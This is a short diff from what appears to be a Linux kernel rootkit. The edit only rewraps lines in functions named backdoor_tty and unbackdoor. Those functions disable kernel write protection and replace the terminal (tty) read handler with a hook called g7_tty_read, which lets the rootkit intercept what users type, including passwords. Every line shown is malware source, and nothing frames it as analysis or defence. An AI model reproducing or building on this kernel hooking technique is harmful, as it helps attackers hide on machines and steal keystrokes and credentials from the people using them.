@@ -23,10 +23,12 @@ void
 backdoor_tty(void)
 {
     if (!current_tty_read) {
-        current_tty_read = ((struct file_operations *)kallsyms_lookup_name("tty_fops"))->read;
+        current_tty_read
+            = ((struct file_operations *)kallsyms_lookup_name("tty_fops"))->read;
 
         disable_protection();
-        ((struct file_operations *)kallsyms_lookup_name("tty_fops"))->read = (void *)g7_tty_read;
+        ((struct file_operations *)kallsyms_lookup_name("tty_fops"))->read
+            = (void *)g7_tty_read;
         enable_protection();
     }
 }
@@ -38,7 +40,8 @@ unbackdoor(void)
 
     if (current_tty_read) {
         disable_protection();
-        ((struct file_operations *)kallsyms_lookup_name("tty_fops"))->read = (void *)current_tty_read;
+        ((struct file_operations *)kallsyms_lookup_name("tty_fops"))->read
+            = (void *)current_tty_read;
         enable_protection();
 
         while ((cur = atomic_read(&tty_read_count)) > 0) {
